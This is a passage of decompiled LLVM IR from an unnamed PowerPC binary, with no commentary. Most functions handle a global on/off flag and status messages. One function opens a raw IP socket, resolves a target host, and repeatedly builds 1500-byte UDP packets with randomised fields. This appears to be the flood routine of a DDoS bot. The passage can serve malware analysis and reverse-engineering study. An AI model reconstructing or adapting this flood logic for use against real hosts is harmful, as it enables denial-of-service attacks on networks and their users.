  %v5_10001840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d18c.53 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001848 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001850 = icmp eq i8 %v3_10001848, 0
  %. = select i1 %v3_10001850, i32 ptrtoint ([28 x i8]* @global_var_1000d1b4.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d1a8.54 to i32)
  %v7_1000188c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d1d0.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001958

dec_label_pc_10001894:                            ; preds = %dec_label_pc_100017fc
  %v3_10001898 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100018a0 = icmp eq i8 %v3_10001898, 0
  br i1 %v3_100018a0, label %dec_label_pc_100018c4, label %dec_label_pc_100018a8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_10001894
  %v5_100018bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d1f4.58 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001894
  %v1_100018c8 = add i32 %arg4, 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i32*
  %v2_100018cc = load i32, i32* %v1_100018cc, align 4
  store i32 %v2_100018cc, i32* @r3, align 4
  %v0_100018d4 = call i32 @function_10006ed4()
  %tmp13 = icmp ult i32 %v0_100018d4, 255
  br i1 %tmp13, label %dec_label_pc_10001900, label %dec_label_pc_100018e4

dec_label_pc_100018e4:                            ; preds = %dec_label_pc_100018c4
  %v5_100018f8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d214.60 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_10001900:                            ; preds = %dec_label_pc_100018c4
  store i8 1, i8* @global_var_1001045c.9, align 1
  store i32 268441896, i32* @lr, align 4
  %v3_10001924 = call i32 @function_10006e24(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 0, i32 256)
  %v2_10001930 = load i32, i32* %v1_100018cc, align 4
  %v2_10001940 = inttoptr i32 %v2_10001930 to i8*
  %v3_10001940 = call i32 @function_10006eb4(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i8* %v2_10001940)
  %v5_10001954 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d23c.63 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %arg4)
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_100018e4, %dec_label_pc_100018a8, %dec_label_pc_1000182c, %dec_label_pc_10001900
  %v0_1000196c = phi i32 [ %v5_100018f8, %dec_label_pc_100018e4 ], [ %v5_100018bc, %dec_label_pc_100018a8 ], [ %v7_1000188c, %dec_label_pc_1000182c ], [ %v5_10001954, %dec_label_pc_10001900 ]
  ret i32 %v0_1000196c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001958, { 3, 0, 1, 2 }
}

define i32 @function_10001970(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001970:
  %v3_10001998 = icmp eq i32 %arg3, 1
  br i1 %v3_10001998, label %dec_label_pc_10001a08, label %dec_label_pc_100019a0

dec_label_pc_100019a0:                            ; preds = %dec_label_pc_10001970
  %v5_100019b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d25c.64 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100019bc = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  %. = select i1 %v3_100019c4, i32 ptrtoint ([28 x i8]* @global_var_1000d1b4.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d1a8.54 to i32)
  %v7_10001a00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d1d0.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_10001970
  %v3_10001a0c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001a14 = icmp eq i8 %v3_10001a0c, 0
  br i1 %v3_10001a14, label %dec_label_pc_10001a1c, label %dec_label_pc_10001a38

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a08
  %v5_10001a30 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d278.66 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a08
  %v1_10001a3c = add i32 %arg4, 4
  %v1_10001a40 = inttoptr i32 %v1_10001a3c to i32*
  %v2_10001a40 = load i32, i32* %v1_10001a40, align 4
  store i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32* @r3, align 4
  store i32 %v2_10001a40, i32* @r4, align 4
  %v2_10001a50 = call i32 @function_1000735c(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 %v2_10001a40)
  %v3_10001a58 = icmp eq i32 %v2_10001a50, 0
  br i1 %v3_10001a58, label %dec_label_pc_10001a7c, label %dec_label_pc_10001a60

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a38
  %v5_10001a74 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d298.68 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a38
  store i8 0, i8* @global_var_1001045c.9, align 1
  %v5_10001a9c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d2b4.70 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a1c, %dec_label_pc_100019a0, %dec_label_pc_10001a7c
  %v0_10001ab4 = phi i32 [ %v5_10001a74, %dec_label_pc_10001a60 ], [ %v5_10001a30, %dec_label_pc_10001a1c ], [ %v7_10001a00, %dec_label_pc_100019a0 ], [ %v5_10001a9c, %dec_label_pc_10001a7c ]
  ret i32 %v0_10001ab4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10012b24.62 to i32), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1001045c.9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001aa0, { 3, 0, 1, 2 }
}

define i32 @function_10001ab8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001ab8:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001ab8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001ab8, i32* %stack_var_-320, align 4
  %v3_10001ae4 = icmp eq i32 %arg3, 1
  br i1 %v3_10001ae4, label %dec_label_pc_10001b20, label %dec_label_pc_10001aec

dec_label_pc_10001aec:                            ; preds = %dec_label_pc_10001ab8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d2d4.71 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i8* null, i8** @global_var_10010460.15, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b20:                            ; preds = %dec_label_pc_10001ab8
  %v1_10001b24 = add i32 %arg4, 4
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v1_10001b28 = inttoptr i32 %v1_10001b24 to i32*
  %v2_10001b28 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b28, i32* @r3, align 4
  %v0_10001b30 = call i32 @function_10006ed4()
  %tmp30 = icmp ult i32 %v0_10001b30, 17
  br i1 %tmp30, label %dec_label_pc_10001b5c, label %dec_label_pc_10001b40

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b20
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b54 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1000d2f4.72 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b20
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v2_10001b64 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b64, i32* %r9.global-to-local, align 4
  %v2_10001b68 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10001b74 = inttoptr i32 %v2_10001b64 to i8*
  %v3_10001b74 = call i32 @function_10006eb4(i32 %v2_10001b68, i8* %v2_10001b74)
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001b80 = call i32 @function_10006ed4()
  %v2_10001b8c = ptrtoint i32* %stack_var_-312 to i32
  %v1_10001b88 = add i32 %v2_10001b8c, -1
  %v2_10001b90 = add i32 %v1_10001b88, %v0_10001b80
  store i32 %v2_10001b90, i32* %r9.global-to-local, align 4
  %v1_10001b94 = add i32 %v2_10001b90, 12
  %v2_10001b94 = inttoptr i32 %v1_10001b94 to i8*
  %v3_10001b94 = load i8, i8* %v2_10001b94, align 1
  %v3_10001b9c = icmp eq i8 %v3_10001b94, 46
  br i1 %v3_10001b9c, label %dec_label_pc_10001ba4, label %dec_label_pc_10001c10.preheader

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b5c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001bac = call i32 @function_10006ed4()
  %v2_10001bbc = add i32 %v1_10001b88, %v0_10001bac
  store i32 %v2_10001bbc, i32* %r9.global-to-local, align 4
  %v3_10001bc4 = add i32 %v2_10001bbc, 12
  %v4_10001bc4 = inttoptr i32 %v3_10001bc4 to i8*
  store i8 0, i8* %v4_10001bc4, align 1
  br label %dec_label_pc_10001c10.preheader

dec_label_pc_10001c10.preheader:                  ; preds = %dec_label_pc_10001b5c, %dec_label_pc_10001ba4
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c8 = call i32 @function_10006ed4()
  %v2_10001c2410 = icmp eq i32 %v0_10001c1c8, 0
  br i1 %v2_10001c2410, label %dec_label_pc_10001c2c, label %dec_label_pc_10001bdc

dec_label_pc_10001bdc:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-304.014 = phi i32 [ %v1_10001c08, %dec_label_pc_10001c04 ], [ 0, %dec_label_pc_10001c10.preheader ]
  %stack_var_-308.113 = phi i32 [ %stack_var_-308.0, %dec_label_pc_10001c04 ], [ 1, %dec_label_pc_10001c10.preheader ]
  %v2_10001be4 = add i32 %stack_var_-304.014, %v2_10001b8c
  store i32 %v2_10001be4, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be4, 12
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v3_10001bf0 = icmp eq i8 %v3_10001be8, 46
  br i1 %v3_10001bf0, label %dec_label_pc_10001bf8, label %dec_label_pc_10001c04

dec_label_pc_10001bf8:                            ; preds = %dec_label_pc_10001bdc
  store i32 %stack_var_-308.113, i32* %r9.global-to-local, align 4
  %v1_10001bfc = add i32 %stack_var_-308.113, 1
  br label %dec_label_pc_10001c04

dec_label_pc_10001c04:                            ; preds = %dec_label_pc_10001bdc, %dec_label_pc_10001bf8
  %stack_var_-308.0 = phi i32 [ %v1_10001bfc, %dec_label_pc_10001bf8 ], [ %stack_var_-308.113, %dec_label_pc_10001bdc ]
  store i32 %stack_var_-304.014, i32* %r9.global-to-local, align 4
  %v1_10001c08 = add i32 %stack_var_-304.014, 1
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c = call i32 @function_10006ed4()
  %v2_10001c24 = icmp ult i32 %v1_10001c08, %v0_10001c1c
  br i1 %v2_10001c24, label %dec_label_pc_10001bdc, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-308.1.lcssa = phi i32 [ 1, %dec_label_pc_10001c10.preheader ], [ %stack_var_-308.0, %dec_label_pc_10001c04 ]
  %v1_10001c30 = sub i32 4, %stack_var_-308.1.lcssa
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c4 = icmp sgt i32 %v1_10001c30, 0
  %v4_10001c8c6 = icmp eq i32 %v1_10001c30, 0
  br i1 %v2_10001c8c4, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c44:                            ; preds = %dec_label_pc_10001c2c, %dec_label_pc_10001c44
  %storemerge27 = phi i32 [ %v1_10001c7c, %dec_label_pc_10001c44 ], [ 0, %dec_label_pc_10001c2c ]
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c50 = call i32 @function_10006ed4()
  %v2_10001c58 = add i32 %v2_10001b68, %v0_10001c50
  store i32 %v2_10001c58, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001c70 = inttoptr i32 %v2_10001c58 to i16*
  store i16 11824, i16* %v3_10001c70, align 2
  %v0_10001c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001c74 = trunc i32 %v0_10001c74 to i8
  %v2_10001c74 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001c74 = add i32 %v2_10001c74, 2
  %v4_10001c74 = inttoptr i32 %v3_10001c74 to i8*
  store i8 %v1_10001c74, i8* %v4_10001c74, align 1
  %v1_10001c7c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c = icmp slt i32 %v1_10001c7c, %v1_10001c30
  br i1 %v2_10001c8c, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c44, %dec_label_pc_10001c2c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v2_10001c9c = call i32 @function_10007644(i32 %v2_10001b68, i32 %v1_10001c30)
  store i32 %v2_10001c9c, i32* %stack_var_-312, align 4
  br i1 %v4_10001c8c6, label %dec_label_pc_10001cb4, label %dec_label_pc_10001cc4

dec_label_pc_10001cb4:                            ; preds = %dec_label_pc_10001c94
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cc4:                            ; preds = %dec_label_pc_10001c94
  %v2_10001ccc = call i32 @function_10000d98(i32 256, i32 %v1_10001c30)
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10001ce0.pre = load i32, i32* %stack_var_-312, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001cb4, %dec_label_pc_10001cc4
  %v0_10001d0017 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  %v3_10001ce0 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v3_10001ce0.pre, %dec_label_pc_10001cc4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  store i32 %storemerge, i32* @global_var_10010464.16, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v4_10001ce4 = inttoptr i32 %v3_10001ce0 to i8*
  store i8* %v4_10001ce4, i8** @global_var_10010460.15, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001b40, %dec_label_pc_10001aec, %dec_label_pc_10001cdc
  %v0_10001d00 = phi i32 [ %v5_10001b54, %dec_label_pc_10001b40 ], [ %v5_10001b00, %dec_label_pc_10001aec ], [ %v0_10001d0017, %dec_label_pc_10001cdc ]
  %v2_10001ce8 = load i32, i32* %stack_var_-320, align 4
  store i32 %v2_10001ce8, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001d00

; uselistorder directives
  uselistorder i32 %v2_10001ccc, { 1, 0 }
  uselistorder i32 %v2_10001c9c, { 1, 0, 2 }
  uselistorder i32 %v1_10001c7c, { 1, 0 }
  uselistorder i32 %v1_10001c30, { 3, 6, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-308.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-304.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001b68, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32)* @function_10000d98, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001ce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c44, { 1, 0 }
  uselistorder label %dec_label_pc_10001c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c04, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c10.preheader, { 1, 0 }
}

define i32 @function_10001d04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001d04:
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = call i32 @function_1000776c(i32 %arg2)
  store i32 %v1_10001d24, i32* @global_var_1001046c.76, align 4
  %v4_10001d40 = icmp eq i32 %v1_10001d24, -1
  br i1 %v4_10001d40, label %dec_label_pc_10001d48, label %dec_label_pc_10001dbc

dec_label_pc_10001d48:                            ; preds = %dec_label_pc_10001d04
  store i32 268442960, i32* @lr, align 4
  %v2_10001d4c = call i32 @function_100077a0(i32 %arg2, i32 -1)
  %v3_10001d5c = icmp eq i32 %v2_10001d4c, 0
  br i1 %v3_10001d5c, label %dec_label_pc_10001d64, label %dec_label_pc_10001d90

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d48
  %v3_10001d68 = load i32, i32* @global_var_10010478.10, align 4
  %v6_10001d84 = call i32 @function_1000041c(i32 %v3_10001d68, i32 ptrtoint ([33 x i8]* @global_var_1000d344.77 to i32), i32 %arg1, i32 %arg2)
  %v0_10001d8c = call i32 @function_10008858()
  br label %dec_label_pc_10001d90

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d48, %dec_label_pc_10001d64
  %v1_10001d94 = add i32 %v2_10001d4c, 16
  %v2_10001d94 = inttoptr i32 %v1_10001d94 to i32*
  %v3_10001d94 = load i32, i32* %v2_10001d94, align 4
  %v1_10001d98 = inttoptr i32 %v3_10001d94 to i32*
  %v2_10001d98 = load i32, i32* %v1_10001d98, align 4
  %v1_10001da8 = add i32 %v2_10001d4c, 12
  %v2_10001da8 = inttoptr i32 %v1_10001da8 to i32*
  %v3_10001da8 = load i32, i32* %v2_10001da8, align 4
  store i32 %v3_10001da8, i32* @r5, align 4
  store i32 268443068, i32* @lr, align 4
  %v4_10001db8 = call i32 @function_1000734c(i32 %v2_10001d98, i32 ptrtoint (i32* @global_var_1001046c.76 to i32), i32 %v3_10001da8, i32 %v2_10001d4c)
  %v3_10001dc0.pre = load i32, i32* @global_var_1001046c.76, align 4
  br label %dec_label_pc_10001dbc

dec_label_pc_10001dbc:                            ; preds = %dec_label_pc_10001d04, %dec_label_pc_10001d90
  %v3_10001dc0 = phi i32 [ %v1_10001d24, %dec_label_pc_10001d04 ], [ %v3_10001dc0.pre, %dec_label_pc_10001d90 ]
  ret i32 %v3_10001dc0

; uselistorder directives
  uselistorder i32 %v3_10001da8, { 1, 0 }
  uselistorder i32 %v2_10001d4c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10001d90, { 1, 0 }
}

define i32 @function_10001de0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001de0:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @function_10004a90(i32 0)
  %v1_10001e20 = call i32 @function_100004f0(i32 %arg2)
  %v3_10001e28 = icmp eq i32 %v1_10001e20, 0
  br i1 %v3_10001e28, label %dec_label_pc_10001e30, label %dec_label_pc_10002108

dec_label_pc_10001e30:                            ; preds = %dec_label_pc_10001de0
  store i32 268443200, i32* @lr, align 4
  %v3_10001e3c = call i32 @function_10007cb8(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10001e3c, -1
  br i1 %tmp32, label %dec_label_pc_10001e5c, label %dec_label_pc_10001e54

dec_label_pc_10001e54:                            ; preds = %dec_label_pc_10001e30
  %v0_10001e58 = call i32 @function_10008858()
  br label %dec_label_pc_10001e5c

dec_label_pc_10001e5c:                            ; preds = %dec_label_pc_10001e30, %dec_label_pc_10001e54
  %v2_10001e60 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001e60, label %dec_label_pc_10001e88, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e5c
  %v5_10001e7c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d368.79 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001e84 = call i32 @function_10008858()
  br label %dec_label_pc_10001e88

dec_label_pc_10001e88:                            ; preds = %dec_label_pc_10001e5c, %dec_label_pc_10001e68
  %v1_10001e8c = add i32 %arg4, 4
  %v1_10001e90 = inttoptr i32 %v1_10001e8c to i32*
  %v2_10001e90 = load i32, i32* %v1_10001e90, align 4
  store i32 268443296, i32* @lr, align 4
  %v3_10001e9c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10001e90, i32 %v1_10001e8c)
  %v1_10001eac = add i32 %arg4, 8
  %v1_10001eb0 = inttoptr i32 %v1_10001eac to i32*
  %v2_10001eb0 = load i32, i32* %v1_10001eb0, align 4
  store i32 268443324, i32* @lr, align 4
  %v2_10001eb8 = inttoptr i32 %v2_10001eb0 to i8*
  %v3_10001eb8 = call i32 @function_10008690(i8* %v2_10001eb8, i32 %v1_10001eac)
  %v1_10001ec8 = add i32 %arg4, 12
  %v1_10001ecc = inttoptr i32 %v1_10001ec8 to i32*
  %v2_10001ecc = load i32, i32* %v1_10001ecc, align 4
  store i32 268443352, i32* @lr, align 4
  %v2_10001ed4 = inttoptr i32 %v2_10001ecc to i8*
  %v3_10001ed4 = call i32 @function_10008690(i8* %v2_10001ed4, i32 %v1_10001ec8)
  %v2_10001ee0 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10001eec = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10001ef8 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @function_10006e24(i32 %v2_10001ef8, i32 10, i32 1472)
  %v2_10001f18 = load i32, i32* %v1_10001e90, align 4
  %v6_10001f34 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d390.81 to i32), i32 %arg2, i32 %v2_10001f18)
  %v1_10001f44 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10001f44, i32* %stack_var_-1536, align 4
  %v1_10001f58 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10001f58, i32* %stack_var_-1536, align 4
  %v3_10001f68 = or i32 %v2_10001ee0, 1
  %v4_10001f68 = inttoptr i32 %v3_10001f68 to i8*
  store i8 0, i8* %v4_10001f68, align 1
  %v3_10001f74 = or i32 %v2_10001ee0, 2
  %v4_10001f74 = inttoptr i32 %v3_10001f74 to i16*
  store i16 1500, i16* %v4_10001f74, align 2
  %v3_10001f80 = add i32 %v2_10001ee0, 6
  %v4_10001f80 = inttoptr i32 %v3_10001f80 to i16*
  store i16 0, i16* %v4_10001f80, align 2
  %v3_10001f8c = add i32 %v2_10001ee0, 9
  %v4_10001f8c = inttoptr i32 %v3_10001f8c to i8*
  store i8 17, i8* %v4_10001f8c, align 1
  %v3_10001f98 = add i32 %v2_10001ee0, 8
  %v4_10001f98 = inttoptr i32 %v3_10001f98 to i8*
  store i8 64, i8* %v4_10001f98, align 4
  %v2_10001fa4 = add i32 %v2_10001ee0, 16
  %v3_10001fa4 = inttoptr i32 %v2_10001fa4 to i32*
  store i32 %v3_10001e9c, i32* %v3_10001fa4, align 4
  %v1_10001fac = urem i32 %tmp10, 65536
  store i32 %v1_10001fac, i32* @r3, align 4
  %v1_10001fb4 = call i32 @function_10007640(i32 %v1_10001fac)
  %v1_10001fc0 = trunc i32 %v1_10001fb4 to i16
  %v3_10001fc0 = add i32 %v2_10001eec, 4
  %v4_10001fc0 = inttoptr i32 %v3_10001fc0 to i16*
  store i16 %v1_10001fc0, i16* %v4_10001fc0, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10001fec = icmp eq i32 %v3_10001eb8, 0
  %v3_10002024 = or i32 %v2_10001eec, 2
  %v4_10002024 = inttoptr i32 %v3_10002024 to i16*
  %v2_10002034 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10002040 = add i32 %v2_10001eec, 6
  %v4_10002040 = inttoptr i32 %v3_10002040 to i16*
  %v2_10002050 = add i32 %v2_10001ee0, 12
  %v3_10002050 = inttoptr i32 %v2_10002050 to i32*
  %v3_10002064 = add i32 %v2_10001ee0, 4
  %v4_10002064 = inttoptr i32 %v3_10002064 to i16*
  %v3_10002080 = add i32 %v2_10001ee0, 10
  %v4_10002080 = inttoptr i32 %v3_10002080 to i16*
  %v2_10002094 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_100020dc = add i32 %v3_10001ed4, %v1_10001e10
  %v1_10001ff8 = urem i32 %v3_10001eb8, 65536
  br label %dec_label_pc_10001fd4

dec_label_pc_10001fd4:                            ; preds = %dec_label_pc_100020f8, %dec_label_pc_10001e88
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10001e88 ], [ %v1_100020fc, %dec_label_pc_100020f8 ]
  store i32 268443608, i32* @lr, align 4
  %v0_10001fd4 = call i32 @function_10008158()
  %v1_10001fe4 = trunc i32 %v0_10001fd4 to i16
  store i16 %v1_10001fe4, i16* %tmp33, align 4
  br i1 %v3_10001fec, label %dec_label_pc_10002014, label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %dec_label_pc_10001fd4
  store i32 %v1_10001ff8, i32* @r3, align 4
  %v1_10002000 = call i32 @function_10007640(i32 %v1_10001ff8)
  %extract.t = trunc i32 %v1_10002000 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002014:                            ; preds = %dec_label_pc_10001fd4
  store i32 268443672, i32* @lr, align 4
  %v0_10002014 = call i32 @function_10008158()
  %extract.t41 = trunc i32 %v0_10002014 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002028:                            ; preds = %dec_label_pc_10001ff4, %dec_label_pc_10002014
  %v1_10002004.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10001ff4 ], [ %extract.t41, %dec_label_pc_10002014 ]
  store i16 %v1_10002004.sink.off0, i16* %v4_10002024, align 2
  %v3_10002034 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %sext3 = mul i32 %v3_10002034, 65536
  %v1_10002038 = sdiv i32 %sext3, 65536
  %v1_10002040 = trunc i32 %v1_10002038 to i16
  store i16 %v1_10002040, i16* %v4_10002040, align 2
  %v0_10002044 = call i32 @function_1000066c()
  store i32 %v0_10002044, i32* %v3_10002050, align 4
  store i32 268443736, i32* @lr, align 4
  %v0_10002054 = call i32 @function_10008158()
  %v1_10002064 = trunc i32 %v0_10002054 to i16
  store i16 %v1_10002064, i16* %v4_10002064, align 4
  %v3_10002074 = call i32 @function_10000e28(i16* %v2_10002034, i32 1500)
  %v1_10002080 = trunc i32 %v3_10002074 to i16
  store i16 %v1_10002080, i16* %v4_10002080, align 2
